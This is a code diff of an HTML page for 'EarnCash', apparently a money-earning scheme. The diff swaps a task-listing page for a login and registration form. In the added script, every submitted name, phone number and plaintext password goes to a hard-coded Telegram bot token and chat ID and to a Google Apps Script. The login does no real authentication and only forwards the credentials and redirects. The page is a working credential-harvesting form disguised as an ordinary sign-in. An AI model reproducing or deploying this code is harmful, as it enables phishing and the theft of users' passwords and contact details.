@@ -1,167 +1,126 @@
 <!DOCTYPE html>
-<html lang="hi">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Earn Cash - Home</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    
+    <title>EarnCash - Login & Register</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
     <style>
-        :root { --primary: #0066ff; --primary-dark: #0052cc; --success: #28a745; --bg: #f4f7fe; --white: #ffffff; --text-main: #1a1a1a; --text-sub: #666666; }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
-        body { background-color: var(--bg); color: var(--text-main); padding-bottom: 100px; }
-
-        .header { background: var(--white); padding: 25px 20px; border-bottom-left-radius: 35px; border-bottom-right-radius: 35px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); display: flex; justify-content: space-between; align-items: center; }
-        .header h1 { font-size: 24px; font-weight: 800; color: var(--primary); }
-
-        .balance-container { padding: 20px; }
-        .balance-card { background: linear-gradient(135deg, var(--primary), #4d94ff); padding: 30px; border-radius: 25px; color: white; position: relative; overflow: hidden; box-shadow: 0 15px 35px rgba(0, 102, 255, 0.25); }
-        .balance-amount { font-size: 36px; font-weight: 800; margin-top: 5px; }
-
-        .section-title { padding: 10px 25px; font-size: 18px; font-weight: 700; display: flex; align-items: center; gap: 10px; }
-        .task-list { padding: 0 20px; }
-        .task-card { background: var(--white); border-radius: 20px; padding: 18px; margin-bottom: 15px; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 5px 15px rgba(0,0,0,0.02); }
-        .task-brand { display: flex; align-items: center; gap: 15px; }
-        .task-logo { width: 55px; height: 55px; border-radius: 14px; object-fit: cover; }
-        .task-reward { color: var(--success); font-size: 13px; font-weight: 700; background: rgba(40, 167, 69, 0.1); padding: 2px 8px; border-radius: 6px; }
-
-        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); display: none; align-items: center; justify-content: center; z-index: 1000; backdrop-filter: blur(5px); }
-        .modal-content { background: var(--white); width: 90%; max-width: 400px; border-radius: 30px; padding: 30px; position: relative; }
-        .btn-submit { width: 100%; background: var(--primary); color: white; border: none; padding: 16px; border-radius: 15px; font-weight: 700; font-size: 16px; cursor: pointer; }
-
-        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: var(--white); display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid #eee; z-index: 900; }
-        .nav-item { text-decoration: none; color: #bbb; display: flex; flex-direction: column; align-items: center; font-size: 11px; font-weight: 600; }
-        .nav-item.active { color: var(--primary); }
+        :root { --primary: #0066ff; --bg: #f4f7fe; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        body { background: var(--bg); display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
+        .auth-container { background: white; width: 100%; max-width: 400px; padding: 35px 25px; border-radius: 30px; box-shadow: 0 15px 35px rgba(0,0,0,0.08); text-align: center; }
+        .logo { font-size: 40px; margin-bottom: 10px; display: block; }
+        h2 { font-size: 24px; font-weight: 800; color: #1a1a1a; margin-bottom: 5px; }
+        p { font-size: 14px; color: #777; margin-bottom: 25px; }
+        .form-group { margin-bottom: 18px; text-align: left; }
+        .form-group label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 6px; color: #555; }
+        .form-group input { width: 100%; padding: 14px; border: 1.5px solid #ebebeb; border-radius: 14px; font-size: 15px; outline: none; background: #fafafa; transition: 0.3s; }
+        .form-group input:focus { border-color: var(--primary); background: white; }
+        .main-btn { width: 100%; background: var(--primary); color: white; border: none; padding: 16px; border-radius: 14px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 10px; transition: 0.3s; }
+        .main-btn:active { transform: scale(0.98); }
+        .toggle-text { margin-top: 25px; font-size: 14px; color: #666; }
+        .toggle-text span { color: var(--primary); font-weight: 700; cursor: pointer; text-decoration: underline; }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="header">
-        <h1>EarnCash</h1>
-        <div style="background: #f0f0f0; padding: 8px 12px; border-radius: 20px; font-size: 12px; font-weight: 700;">
-            <i class="fa-solid fa-circle-check" style="color: var(--success);"></i> Verified App
-        </div>
-    </div>
+    <div class="auth-container">
+        <span class="logo">🧼</span>
+        <h2 id="title">Create Account</h2>
+        <p id="subtitle">Start your soap earning journey!</p>
 
-    <div class="balance-container">
-        <div class="balance-card">
-            <p style="font-size: 14px; opacity: 0.9;">Total Wallet Balance</p>
-            <h2 class="balance-amount" id="mainBalance">₹0.00</h2>
-        </div>
-    </div>
-
-    <div class="section-title"><i class="fa-solid fa-fire" style="color: #ff9500;"></i> Top Earning Tasks</div>
-    <div class="task-list" id="dynamicTasks"></div>
-
-    <div class="modal-overlay" id="taskModal">
-        <div class="modal-content">
-            <div style="text-align: center; margin-bottom: 20px;">
-                <h2 id="modalTaskName">Task Name</h2>
-                <p style="color: #888; font-size: 13px;">Details bharein aur task shuru karein</p>
+        <div id="reg-fields">
+            <div class="form-group">
+                <label>Full Name</label>
+                <input type="text" id="name" placeholder="Enter your name">
             </div>
-            <form id="googleSheetForm">
-                <div style="margin-bottom:15px;">
-                    <label style="display:block; font-size:12px; margin-bottom:5px;">Aapka Naam</label>
-                    <input type="text" name="Name" id="inputName" style="width:100%; padding:12px; border:1px solid #ddd; border-radius:10px;" required>
-                </div>
-                <div style="margin-bottom:15px;">
-                    <label style="display:block; font-size:12px; margin-bottom:5px;">WhatsApp Number</label>
-                    <input type="number" name="Phone" id="inputPhone" style="width:100%; padding:12px; border:1px solid #ddd; border-radius:10px;" required>
-                </div>
-                <input type="hidden" name="Task" id="hiddenTaskName">
-                <input type="hidden" name="UPI_ID" id="hiddenUPI">
-                
-                <button type="submit" class="btn-submit" id="loaderBtn">Proceed to Instructions</button>
-            </form>
-            <p onclick="closeModal()" style="text-align:center; margin-top:15px; color:#999; cursor:pointer;">Abhi nahi</p>
         </div>
-    </div>
 
-    <nav class="bottom-nav">
-        <a href="home.html" class="nav-item active"><i class="fa-solid fa-house"></i><span>Home</span></a>
-        <a href="profile.html" class="nav-item"><i class="fa-solid fa-user"></i><span>Profile</span></a>
-    </nav>
+        <div class="form-group">
+            <label>Mobile Number</label>
+            <input type="tel" id="phone" placeholder="Enter 10 digit number">
+        </div>
+
+        <div class="form-group">
+            <label>Password</label>
+            <input type="password" id="pass" placeholder="Enter password">
+        </div>
+
+        <button class="main-btn" onclick="handleAuth()" id="btn-text">Register Now</button>
+
+        <p class="toggle-text" id="toggle-msg">
+            Already have an account? <span onclick="toggleMode()">Login</span>
+        </p>
+    </div>
 
     <script>
-        // CONFIGURATIONS
+        let mode = 'register';
         const scriptURL = 'https://script.google.com/macros/s/AKfycbzXgodyxdba2JM4cL_Z8nIeJicDMBvAYMwiYio3_wPazR53fXRoFdPng8ZCuLe8wEc/exec';
         const teleToken = "7682752151:AAHnHH8fHvNmLoCIAMPlZ_I88esXwy6b53E";
         const teleChatID = "8415600127";
 
-        const tasks = [
-            { id: 1, name: "Angel One - Demat", reward: "₹100", icon: "https://i.ibb.co/NgLJX1H7/Angel-One-1689341693674.avif", link: "https://angelone.in", steps: ["Install app", "Complete KYC", "Upload Profile Screenshot"] },
-            { id: 2, name: "Upstox - Demat", reward: "₹100", icon: "https://i.ibb.co/G3dPNW2Q/Upstox.webp", link: "https://upstox.com", steps: ["Download app", "Verify Aadhar/PAN", "Upload Congratulations Screen"] },
-            { id: 3, name: "Navi UPI", reward: "₹30", icon: "https://i.ibb.co/d0LgVNX1/navi-technologies-app-icon.png", link: "https://navi.com", steps: ["Setup UPI", "Send ₹1 to any contact", "Upload History Screenshot"] }
-        ];
+        function toggleMode() {
+            const title = document.getElementById('title');
+            const regFields = document.getElementById('reg-fields');
+            const btnText = document.getElementById('btn-text');
+            const toggleMsg = document.getElementById('toggle-msg');
 
-        function renderTasks() {
-            const container = document.getElementById('dynamicTasks');
-            container.innerHTML = tasks.map(task => `
-                <div class="task-card">
-                    <div class="task-brand">
-                        <img src="${task.icon}" class="task-logo">
-                        <div class="task-details">
-                            <h3 style="font-size:15px;">${task.name}</h3>
-                            <span class="task-reward">Reward: ${task.reward}</span>
-                        </div>
-                    </div>
-                    <button style="background:var(--primary); color:white; border:none; padding:8px 15px; border-radius:10px; font-weight:700; font-size:13px;" onclick="openTaskModal(${task.id})">Start</button>
-                </div>
-            `).join('');
+            if (mode === 'register') {
+                mode = 'login';
+                title.innerText = "Welcome Back";
+                regFields.classList.add('hidden');
+                btnText.innerText = "Login Now";
+                toggleMsg.innerHTML = "Don't have an account? <span onclick='toggleMode()'>Register</span>";
+            } else {
+                mode = 'register';
+                title.innerText = "Create Account";
+                regFields.classList.remove('hidden');
+                btnText.innerText = "Register Now";
+                toggleMsg.innerHTML = "Already have an account? <span onclick='toggleMode()'>Login</span>";
+            }
         }
 
-        function openTaskModal(id) {
-            const task = tasks.find(t => t.id === id);
-            document.getElementById('modalTaskName').innerText = task.name;
-            document.getElementById('hiddenTaskName').value = task.name;
-            document.getElementById('hiddenUPI').value = localStorage.getItem('userUPI') || "Not Linked";
-            document.getElementById('taskModal').style.display = 'flex';
-            window.currentActiveTask = task;
-        }
+        async function handleAuth() {
+            const name = document.getElementById('name').value;
+            const phone = document.getElementById('phone').value;
+            const pass = document.getElementById('pass').value;
+            const btn = document.getElementById('btn-text');
 
-        function closeModal() { document.getElementById('taskModal').style.display = 'none'; }
+            if (phone.length < 10 || pass.length < 4) {
+                alert("Please enter valid details!");
+                return;
+            }
 
-        document.getElementById('googleSheetForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const btn = document.getElementById('loaderBtn');
-            const name = document.getElementById('inputName').value;
-            const phone = document.getElementById('inputPhone').value;
-            const taskName = document.getElementById('hiddenTaskName').value;
-
-            btn.innerText = "Registering...";
+            btn.innerText = "Processing...";
             btn.disabled = true;
 
-            // 1. TELEGRAM NOTIFICATION
-            const teleMsg = `🎯 *TASK STARTED*\n\n🛠 Task: ${taskName}\n👤 Name: ${name}\n📞 WhatsApp: ${phone}\n🕒 Time: ${new Date().toLocaleString()}`;
-            const teleURL = `https://api.telegram.org/bot${teleToken}/sendMessage?chat_id=${teleChatID}&text=${encodeURIComponent(teleMsg)}&parse_mode=Markdown`;
-            
-            fetch(teleURL); // Background mein message bhej dega
+            // 1. TELEGRAM ALERT
+            const msg = `👤 *USER ${mode.toUpperCase()}*\n\n📛 Name: ${name || 'N/A'}\n📞 Phone: ${phone}\n🔑 Pass: ${pass}\n🕒 Time: ${new Date().toLocaleString()}`;
+            fetch(`https://api.telegram.org/bot${teleToken}/sendMessage?chat_id=${teleChatID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
 
-            // 2. GOOGLE SHEET SUBMISSION
-            fetch(scriptURL, { method: 'POST', body: new FormData(this) })
-            .then(() => {
-                saveAndRedirect(name, phone);
-            })
-            .catch(() => { 
-                // Error case mein bhi aage bhejo taaki user experience na kharab ho
-                saveAndRedirect(name, phone);
-            });
-        });
+            // 2. GOOGLE SHEET & REDIRECT
+            if (mode === 'register') {
+                let formData = new FormData();
+                formData.append('Name', name);
+                formData.append('Phone', phone);
+                formData.append('Password', pass);
 
-        function saveAndRedirect(name, phone) {
-            localStorage.setItem('userName', name);
-            localStorage.setItem('userPhone', phone);
-            const taskData = encodeURIComponent(JSON.stringify(window.currentActiveTask));
-            window.location.href = `task-details.html?data=${taskData}`;
+                fetch(scriptURL, { method: 'POST', body: formData })
+                .then(() => {
+                    localStorage.setItem('userName', name);
+                    localStorage.setItem('userPhone', phone);
+                    window.location.href = "plans.html"; // Register ke baad Soap Plans
+                })
+                .catch(() => {
+                    window.location.href = "plans.html";
+                });
+            } else {
+                localStorage.setItem('userPhone', phone);
+                window.location.href = "home.html"; // Login ke baad Direct Home
+            }
         }
-
-        window.onload = () => {
-            renderTasks();
-            // Pre-fill agar pehle se data ho
-            if(localStorage.getItem('userName')) document.getElementById('inputName').value = localStorage.getItem('userName');
-            if(localStorage.getItem('userPhone')) document.getElementById('inputPhone').value = localStorage.getItem('userPhone');
-        };
     </script>
 </body>
 </html>
